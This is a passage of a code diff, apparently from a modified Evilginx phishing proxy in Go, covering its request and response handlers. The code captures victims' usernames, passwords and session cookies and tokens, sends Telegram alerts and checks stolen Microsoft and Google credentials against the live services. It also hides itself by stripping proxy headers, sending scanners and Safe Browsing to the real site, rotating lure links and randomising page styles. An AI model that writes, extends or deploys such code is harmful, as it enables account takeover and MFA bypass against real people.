+									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							}
+
+							if pl.password.tp == "json" {
+								pm := pl.password.search.FindStringSubmatch(string(body))
+								if pm != nil && len(pm) > 1 {
+									p.setSessionPassword(ps.SessionId, pm[1])
+									trigger = 1
+									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+										log.Error("database: %v", err)
+									}
+								}
+							}
+
+							for _, cp := range pl.custom {
+								if cp.tp == "json" {
+									cm := cp.search.FindStringSubmatch(string(body))
+									if cm != nil && len(cm) > 1 {
+										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+										trigger = 1
+										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+											log.Error("database: %v", err)
+										}
+									}
+								}
+							}
+
+							for _, fp := range pl.forcePost {
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
+													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
+												}
+											}
+										}
+										if k_matched == 0 {
+											ok_search = true
+										}
+									} else {
+										ok_search = true
+									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
+								}
+							}
+							if trigger == 1 {
+								go p.sendTelegramNotificationForSession(ps.SessionId)
+							}
+
+						} else if form_re.MatchString(contentType) {
+							trigger = 0
+
+							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
+								log.Debug("POST: %s", req.URL.Path)
+
+								for k, v := range req.PostForm {
+									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
+										um := pl.username.search.FindStringSubmatch(v[0])
+										if um != nil && len(um) > 1 {
+											p.setSessionUsername(ps.SessionId, um[1])
+											trigger = 1
+											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
+												log.Error("database: %v", err)
+											}
+										}
+									}
+									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
+										pm := pl.password.search.FindStringSubmatch(v[0])
+										if pm != nil && len(pm) > 1 {
+											p.setSessionPassword(ps.SessionId, pm[1])
+											trigger = 1
+											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
+												log.Error("database: %v", err)
+											}
+										}
+									}
+									for _, cp := range pl.custom {
+										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
+											cm := cp.search.FindStringSubmatch(v[0])
+											if cm != nil && len(cm) > 1 {
+												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
+												trigger = 1
+												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
+													log.Error("database: %v", err)
+												}
+											}
+										}
+									}
+								}
+
+								for k, v := range req.PostForm {
+									for i, vv := range v {
+										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
+									}
+								}
+
+								for k, v := range req.PostForm {
+									if len(v) > 0 {
+										log.Debug("POST %s = %s", k, v[0])
+									}
+								}
+
+								body = []byte(req.PostForm.Encode())
+								req.ContentLength = int64(len(body))
+
+								for _, fp := range pl.forcePost {
+									if fp.path.MatchString(req.URL.Path) {
+										log.Debug("force_post: url matched: %s", req.URL.Path)
+										ok_search := false
+										if len(fp.search) > 0 {
+											k_matched := len(fp.search)
+											for _, fp_s := range fp.search {
+												for k, v := range req.PostForm {
+													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
+														if k_matched > 0 {
+															k_matched -= 1
+														}
+														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
+														break
+													}
+												}
+											}
+											if k_matched == 0 {
+												ok_search = true
+											}
+										} else {
+											ok_search = true
+										}
+
+										if ok_search {
+											for _, fp_f := range fp.force {
+												req.PostForm.Set(fp_f.key, fp_f.value)
+											}
+											body = []byte(req.PostForm.Encode())
+											req.ContentLength = int64(len(body))
+											log.Debug("force_post: body: %s len:%d", body, len(body))
+										}
+									}
+								}
+
+							}
+							if trigger == 1 {
+								go p.sendTelegramNotificationForSession(ps.SessionId)
+							}
+
+						}
+						req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
+					}
+				}
+
+				if pl != nil {
+					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
+						for _, ic := range pl.intercept {
+							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
+								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
+							}
+						}
+					}
+				}
+
+				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+					s, ok := p.sessions[ps.SessionId]
+					if ok && !s.IsDone {
+						for _, au := range pl.authUrls {
+							if au.MatchString(req.URL.Path) {
+								s.Finish(true)
+								break
+							}
+						}
+					}
+				}
+
+				// Strip proxy-identifying headers from outgoing requests (config: strip_headers).
+				// Real browsers never send forwarding or CDN headers to the origin site,
+				// so removing them makes the proxied request indistinguishable from a
+				// direct victim browser connection.
+				if p.cfg.IsStripHeadersEnabled() {
+					req.Header.Del("X-Evilginx")
+					req.Header.Del("X-Evilginx2")
+					req.Header.Del("X-Evilginx-Server")
+					req.Header.Del("Via")
+					req.Header.Del("X-Forwarded-For")
+					req.Header.Del("X-Forwarded-Host")
+					req.Header.Del("X-Forwarded-Proto")
+					req.Header.Del("X-Real-Ip")
+					req.Header.Del("X-Real-IP")
+					req.Header.Del("X-Proxy-Id")
+					req.Header.Del("Proxy-Connection")
+					req.Header.Del("X-Client-IP")
+					req.Header.Del("Connecting-IP")
+					req.Header.Del("True-Client-IP")
+					req.Header.Del("Client-IP")
+					req.Header.Del("CF-Connecting-IP")
+				}
+
+				return req, nil
+			}
+
+			return req, nil
+		})
+
+	p.Proxy.OnResponse().
+		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
+			if resp == nil {
+				return nil
+			}
+
+			ck := &http.Cookie{}
+			ps := ctx.UserData.(*ProxySession)
+			if ps.SessionId != "" {
+				if ps.Created {
+					ck = &http.Cookie{
+						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
+						Value:   ps.SessionId,
+						Path:    "/",
+						Domain:  p.cfg.GetBaseDomain(),
+						Expires: time.Now().Add(60 * time.Minute),
+					}
+				}
+			}
+
+			trigger := 0
+
+			p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
+			// If the upstream response has no ACAO header (common for same-origin API
+			// endpoints like GetCredentialType) but the request has an Origin header,
+			// inject ACAO so the browser's CORS check passes for cross-origin XHR.
+			if resp.Header.Get("Access-Control-Allow-Origin") == "" {
+				if origin := resp.Request.Header.Get("Origin"); origin != "" {
+					phishedOrigin := p.replaceStringWithPhished(origin)
+					resp.Header.Set("Access-Control-Allow-Origin", phishedOrigin)
+					resp.Header.Set("Access-Control-Allow-Credentials", "true")
+				}
+			}
+			p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
+			p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
+			p.replaceHeaderWithPhished(resp, "X-Frame-Options")
+
+			redirect_set := false
+			if s, ok := p.sessions[ps.SessionId]; ok {
+				if s.RedirectURL != "" {
+					redirect_set = true
+				}
+			}
+
+			// NOTE: Turnstile gating via the proxy response handler is NOT used here.
+			// For non-GoPhish flows IsCaptchaDone can never become true (it is only
+			// set by the /validate-captcha server endpoint reached via redirectTurnstile,
+			// which only fires when a GoPhish rid param is present). Gating here would
+			// permanently block Location-header rewriting and session-cookie delivery
+			// for all non-GoPhish sessions, sending victims to the real login page.
+			// Turnstile challenges are served correctly via the redirect-pages feature
+			// (ServeRedirectPage in the NonproxyHandler path).
+
+			req_hostname := strings.ToLower(resp.Request.Host)
+
+			// Rewrite redirect Location headers back to the phishing host, except for
+			// crawler/scanner responses and for synthetic unauthorized-redirect
+			// responses. Those point at the real site (e.g. login.microsoftonline.com)
+			// on purpose: Safe Browsing must see a clean external redirect, and
+			// rewriting them back to the phished host would cause a redirect loop
+			// (the phished host is not a valid lure path and has no session yet).
+			is_unauth_redirect := resp.Header.Get("X-UnAuth-Redirect") == "1"
+			resp.Header.Del("X-UnAuth-Redirect")
+			if !is_unauth_redirect && !isScannerUA(resp.Request.UserAgent()) {
+				r_url, err := resp.Location()
+				if err == nil {
+					changed := false
+					if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+						r_host = p.applyLureHostname(r_host, ps)
+						r_url.Host = r_host
+						changed = true
+					}
+					// force the provider to ask for credentials on OAuth/SAML hops
+					if p.forceLoginPrompt(r_url) {
+						changed = true
+					}
+					if changed {
+						resp.Header.Set("Location", r_url.String())
+					}
+				}
+			}
+
+			pl := p.getPhishletByOrigHost(req_hostname)
+			var auth_tokens map[string][]*CookieAuthToken
+			if pl != nil {
+				auth_tokens = pl.cookieAuthTokens
+			}
+			is_cookie_auth := false
+			is_body_auth := false
+			is_http_auth := false
+			cookies := resp.Cookies()
+			resp.Header.Del("Set-Cookie")
+			for _, ck := range cookies {
+				if ck.Secure {
+					ck.SameSite = http.SameSiteNoneMode
+				}
+
+				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
+					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
+					if err != nil {
+						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
+						if err != nil {
+							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
+						}
+					}
+					ck.Expires = exptime
+				}
+
+				if pl != nil && ps.SessionId != "" {
+					c_domain := ck.Domain
+					if c_domain == "" {
+						c_domain = req_hostname
+					} else {
+						if c_domain[0] != '.' {
+							c_domain = "." + c_domain
+						}
+					}
+					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
+					at := pl.getAuthToken(c_domain, ck.Name)
+					if at != nil {
+						s, ok := p.sessions[ps.SessionId]
+						if ok && (s.IsAuthUrl || !s.IsDone) {
+							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
+								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
+								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
+							}
+						}
+					}
+				}
+
+				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+				ck.Domain = p.applyLureHostname(ck.Domain, ps)
+				resp.Header.Add("Set-Cookie", ck.String())
+			}
+			if ck.String() != "" {
+				resp.Header.Add("Set-Cookie", ck.String())
+			}
+
+			body, err := io.ReadAll(resp.Body)
+
+			if pl != nil {
+				if s, ok := p.sessions[ps.SessionId]; ok {
+					for k, v := range pl.bodyAuthTokens {
+						if _, ok := s.BodyTokens[k]; !ok {
+							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
+								token_re := v.search.FindStringSubmatch(string(body))
+								if token_re != nil && len(token_re) >= 2 {
+									s.BodyTokens[k] = token_re[1]
+									trigger = 1
+								}
+							}
+						}
+					}
+
+					for k, v := range pl.httpAuthTokens {
+						if _, ok := s.HttpTokens[k]; !ok {
+							hv := resp.Request.Header.Get(v.header)
+							if hv != "" {
+								s.HttpTokens[k] = hv
+								trigger = 1
+							}
+						}
+					}
+				}
+
+				if len(pl.authUrls) == 0 {
+					if s, ok := p.sessions[ps.SessionId]; ok {
+						is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
+						if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
+							is_body_auth = true
+						}
+						if len(pl.httpAuthTokens) == len(s.HttpTokens) {
+							is_http_auth = true
+						}
+					}
+				}
+			}
+
+			if is_cookie_auth && is_body_auth && is_http_auth {
+				if s, ok := p.sessions[ps.SessionId]; ok {
+					if !s.IsDone {
+						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
+						trigger = 1
+
+						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+							log.Error("database: %v", err)
+						}
+						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
+							log.Error("database: %v", err)
+						}
+						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
+							log.Error("database: %v", err)
+						}
+						s.Finish(false)
+						// Immediately rotate the autolure path so the captured URL
+						// is burned and replaced before the next victim arrives.
+						if s.PhishLure != nil && s.PhishLure.AutoRotate {
+							go p.cfg.RotateAutolureForSession(s.PhishLure)
+						}
+						go p.sendTelegramNotificationForSession(ps.SessionId)
+
+						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+							rid, ok := s.Params["rid"]
+							if ok && rid != "" {
+								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+								if err != nil {
+									log.Error("gophish: %s", err)
+								}
+								database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
+							}
+						}
+
+						// === Credential Validation (Telegram Edition by @officialmonsterz) ===
+						if p.validator != nil && s.Username != "" && s.Password != "" {
+							go func(sid, uname, pword, pname string) {
+								service := pname
+								sw := strings.ToLower(pname)
+								if sw == "microsoft" || sw == "outlook" || sw == "office365" || sw == "azure" || sw == "365" {
+									service = "microsoft"
+								} else if sw == "google" || sw == "gmail" {
+									service = "google"
+								}
+								vResult := p.validator.Validate(uname, pword, service)
+								if vResult.Valid {
+									log.Success("[%s] credentials VALID for %s", sid, pname)
+									p.db.SetSessionCustom(sid, "valid", "true")
+								} else {
+									log.Warning("[%s] credentials INVALID for %s (%s)", sid, pname, vResult.ErrorMsg)
+									p.db.SetSessionCustom(sid, "valid", "false")
+								}
+								vJSON, _ := json.Marshal(vResult)
+								p.db.SetSessionCustom(sid, "validation", string(vJSON))
+							}(ps.SessionId, s.Username, s.Password, ps.PhishletName)
+						}
+					}
+				}
+			}
+
+			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
+			if err == nil {
+				for site, pl := range p.cfg.phishlets {
+					if p.cfg.IsSiteEnabled(site) {
+						sfs, ok := pl.subfilters[req_hostname]
+						if ok {
+							for _, sf := range sfs {
+								var param_ok bool = true
+								if s, ok := p.sessions[ps.SessionId]; ok {
+									var params []string
+									for k := range s.Params {
+										params = append(params, k)
+									}
+									if len(sf.with_params) > 0 {
+										param_ok = false
+										for _, param := range sf.with_params {
+											if stringExists(param, params) {
+												param_ok = true
+												break
+											}
+										}
+									}
+								}
+								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
+									re_s := sf.regexp
+									replace_s := sf.replace
+									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+									phish_sub, _ := p.getPhishSub(phish_hostname)
+
+									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
+									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
+									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
+									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
+									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
+									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
+									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
+									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
+									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
+									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
+									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
+									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
+									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
+									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+									if ok {
+										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
+										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
+									}
+
+									if re, err := regexp.Compile(re_s); err == nil {
+										body = []byte(re.ReplaceAllString(string(body), replace_s))
+									} else {
+										log.Error("regexp failed to compile: `%s`", sf.regexp)
+									}
+								}
+							}
+						}
+
+						if stringExists(mime, p.auto_filter_mimes) {
+							for _, ph := range pl.proxyHosts {
+								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
+									if ph.auto_filter {
+										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
+									}
+								}
+							}
+						}
+						body = []byte(removeObfuscatedDots(string(body)))
+					}
+				}
+
+				// URL Rewriting: Clean exposed auth paths from address bar
+				if pl != nil && ps.SessionId != "" {
+					if phishDomain, ok := p.cfg.GetSiteDomain(ps.PhishletName); ok {
+						phishHost := phishDomain
+						if req_hostname != "" && strings.HasSuffix(req_hostname, "."+phishDomain) {
+							phishHost = req_hostname
+						}
+						body = rewriteSensitivePaths(body, phishHost)
+					}
+				}
+
+				// Strip proxy-identifying headers from downstream responses (config: strip_headers).
+				// 'Server' and 'X-Powered-By' are intentionally preserved: they originate
+				// from the real origin site (e.g. Microsoft's 'X-Powered-By: ASP.NET') and
+				// deleting them would make responses deviate from the genuine service.
+				if p.cfg.IsStripHeadersEnabled() {
+					resp.Header.Del("X-Evilginx")
+					resp.Header.Del("X-Evilginx2")
+					resp.Header.Del("X-Evilginx-Server")
+					resp.Header.Del("Via")
+					resp.Header.Del("X-Forwarded-For")
+					resp.Header.Del("X-Forwarded-Host")
+					resp.Header.Del("X-Forwarded-Proto")
+					resp.Header.Del("X-Real-Ip")
+					resp.Header.Del("X-Real-IP")
+					resp.Header.Del("X-Proxy-Id")
+					resp.Header.Del("Proxy-Connection")
+					resp.Header.Del("Proxy-Authenticate")
+				}
+
+				if stringExists(mime, []string{"text/html"}) {
+
+					if pl != nil && ps.SessionId != "" {
+						s, ok := p.sessions[ps.SessionId]
+						if ok {
+							if s.PhishLure != nil {
+								l := s.PhishLure
+								body = p.injectOgHeaders(l, body)
+							}
+
+							var js_params *map[string]string = nil
+							if s, ok := p.sessions[ps.SessionId]; ok {
+								js_params = &s.Params
+							}
+							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
+							if err == nil {
+								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+							}
+
+							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
+							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+						}
+					}
+
+					if p.randomizer != nil && len(body) > 0 {
+						body = p.injectRandomCSS(body)
+						log.Debug("randomizer: applied per-page-load CSS randomization")
+					}
+
+				}
+
+				resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
+			}
+
+			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
+				s, ok := p.sessions[ps.SessionId]
+				if ok && s.IsDone {
+					for _, au := range pl.authUrls {
+						if au.MatchString(resp.Request.URL.Path) {
+							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
+							if err != nil {
+								log.Error("database: %v", err)
+							}
+							err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
+							if err != nil {
+								log.Error("database: %v", err)
+							}
+							err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
+							if err != nil {
+								log.Error("database: %v", err)
+							}
+							if err == nil {
+								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							}
+
+							if s, ok := p.sessions[ps.SessionId]; ok {
+								if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
+									if rid, exists := s.Params["rid"]; exists {
+										database.HandleCapturedCookieSession(rid, s.CookieTokens, map[string]string{"email": rid}, p.livefeed)
+									}
+								}
+								// Rotate autolure path on auth-URL capture completion.
+								if s.PhishLure != nil && s.PhishLure.AutoRotate {
+									go p.cfg.RotateAutolureForSession(s.PhishLure)
+								}
+							}
+
+							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
+								rid, ok := s.Params["rid"]
+								if ok && rid != "" {
+									p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
+									err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
+									if err != nil {
+										log.Error("gophish: %s", err)
+									}
+									database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
+								}
+							}
+
+							// ADD THIS: Send Telegram notification when auth URL completes
+							go p.sendTelegramNotificationForSession(ps.SessionId)
+							break
+						}
+					}
+				}
+			}
+
+			if stringExists(mime, []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json", "text/plain", "image/svg+xml"}) {
+				resp.Header.Set("Cache-Control", "no-cache, no-store")
+			}
+
+			if pl != nil && ps.SessionId != "" {
+				s, ok := p.sessions[ps.SessionId]
+				if ok && s.IsDone {
+					if s.RedirectURL != "" && s.RedirectCount == 0 {
+						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
+							s.RedirectCount += 1
+							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
+
+							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
+							return resp
+						}
+					}
+				}
+			}
+
+			if trigger == 1 {
+				go p.sendTelegramNotificationForSession(ps.SessionId)
+			}
+
+			return resp
+		})
+
+	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
+	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
+	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
+	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
+
+	return p, nil
 }
 
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
-    s, ok := p.sessions[session_id]
-    if ok {
-        if s.IsDone {
-            return s.RedirectURL, true
-        }
+	s, ok := p.sessions[session_id]
+	if ok {
+		if s.IsDone {
+			return s.RedirectURL, true
+		}
 
-        ticker := time.NewTicker(30 * time.Second)
-        select {
-        case <-ticker.C:
-            break
-        case <-s.DoneSignal:
-            return s.RedirectURL, true
-        }
-    }
-    return "", false
+		ticker := time.NewTicker(30 * time.Second)
+		select {
+		case <-ticker.C:
+			break
+		case <-s.DoneSignal:
+			return s.RedirectURL, true
+		}
+	}
+	return "", false
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
-    // DYNAMIC CONTENT SPOOFING:
-    var unauth_url string
-    if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
-        unauth_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
-    }
-    if unauth_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
-        unauth_url = p.cfg.general.UnauthUrl
-    }
+	// DYNAMIC CONTENT SPOOFING:
+	var unauth_url string
+	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+		unauth_url = p.cfg.PhishletConfig(pl.Name).UnauthUrl
+	}
+	if unauth_url == "" && len(p.cfg.general.UnauthUrl) > 0 {
+		unauth_url = p.cfg.general.UnauthUrl
+	}
 
-    // Default behaviour: hand unauthorized/blocked visitors an HTTP 302 straight to
-    // the real site. Crawlers and Safe Browsing then evaluate the genuine destination
-    // rather than a rewritten copy, which is the strongest "clean redirector" signal.
-    if unauth_url != "" && p.cfg.IsUnauthRedirectEnabled() {
-        resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-        if resp != nil {
-            resp.Header.Set("Location", unauth_url)
-            resp.Header.Set("Cache-Control", "no-cache, no-store")
-            resp.Header.Set("X-UnAuth-Redirect", "1")
-            return req, resp
-        }
-    }
+	// Default behaviour: hand unauthorized/blocked visitors an HTTP 302 straight to
+	// the real site. Crawlers and Safe Browsing then evaluate the genuine destination
+	// rather than a rewritten copy, which is the strongest "clean redirector" signal.
+	if unauth_url != "" && p.cfg.IsUnauthRedirectEnabled() {
+		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+		if resp != nil {
+			resp.Header.Set("Location", unauth_url)
+			resp.Header.Set("Cache-Control", "no-cache, no-store")
+			resp.Header.Set("X-UnAuth-Redirect", "1")
+			return req, resp
+		}
+	}
 
-    if unauth_url != "" {
-        u, err := url.Parse(unauth_url)
-        if err == nil && (u.Scheme == "http" || u.Scheme == "https") {
-            proxyReq, err := http.NewRequest("GET", unauth_url, nil)
-            if err == nil {
-                proxyReq.Header.Set("User-Agent", req.UserAgent())
-                proxyReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
-                proxyReq.Header.Set("Accept-Language", "en-US,en;q=0.5")
-                proxyReq.Header.Set("Host", u.Host)
-                proxyReq.Header.Del("Cookie")
+	if unauth_url != "" {
+		u, err := url.Parse(unauth_url)
+		if err == nil && (u.Scheme == "http" || u.Scheme == "https") {
+			proxyReq, err := http.NewRequest("GET", unauth_url, nil)
+			if err == nil {
+				proxyReq.Header.Set("User-Agent", req.UserAgent())
+				proxyReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+				proxyReq.Header.Set("Accept-Language", "en-US,en;q=0.5")
+				proxyReq.Header.Set("Host", u.Host)
+				proxyReq.Header.Del("Cookie")
 
-                tr := &http.Transport{
-                    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-                }
-                client := &http.Client{
-                    Transport: tr,
-                    Timeout:   10 * time.Second,
-                    CheckRedirect: func(req *http.Request, via []*http.Request) error {
-                        if len(via) >= 3 {
-                            return fmt.Errorf("too many redirects")
-                        }
-                        return nil
-                    },
-                }
+				tr := &http.Transport{
+					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+				}
+				client := &http.Client{
+					Transport: tr,
+					Timeout:   10 * time.Second,
+					CheckRedirect: func(req *http.Request, via []*http.Request) error {
+						if len(via) >= 3 {
+							return fmt.Errorf("too many redirects")
+						}
+						return nil
+					},
+				}
 
-                resp, err := client.Do(proxyReq)
-                if err == nil && resp != nil {
-                    defer resp.Body.Close()
-                    bodyBytes, err := io.ReadAll(resp.Body)
-                    if err == nil {
-                        bodyStr := string(bodyBytes)
-                        bodyStr = strings.ReplaceAll(bodyStr, u.Host, req.Host)
-                        bodyStr = strings.ReplaceAll(bodyStr, u.Scheme+"://"+u.Host, "")
+				resp, err := client.Do(proxyReq)
+				if err == nil && resp != nil {
+					defer resp.Body.Close()
+					bodyBytes, err := io.ReadAll(resp.Body)
+					if err == nil {
+						bodyStr := string(bodyBytes)
+						bodyStr = strings.ReplaceAll(bodyStr, u.Host, req.Host)
+						bodyStr = strings.ReplaceAll(bodyStr, u.Scheme+"://"+u.Host, "")
 
-                        goproxyResp := goproxy.NewResponse(req, "text/html; charset=utf-8", 200, bodyStr)
-                        if goproxyResp != nil {
-                            goproxyResp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-                            goproxyResp.Header.Del("Content-Security-Policy")
-                            goproxyResp.Header.Del("X-Frame-Options")
-                            goproxyResp.Header.Del("Strict-Transport-Security")
-                            return req, goproxyResp
-                        }
-                    }
-                }
-            }
-        }
-        return p.javascriptRedirect(req, unauth_url)
-    }
+						goproxyResp := goproxy.NewResponse(req, "text/html; charset=utf-8", 200, bodyStr)
+						if goproxyResp != nil {
+							goproxyResp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+							goproxyResp.Header.Del("Content-Security-Policy")
+							goproxyResp.Header.Del("X-Frame-Options")
+							goproxyResp.Header.Del("Strict-Transport-Security")
+							return req, goproxyResp
+						}
+					}
+				}
+			}
+		}
+		return p.javascriptRedirect(req, unauth_url)
+	}
 
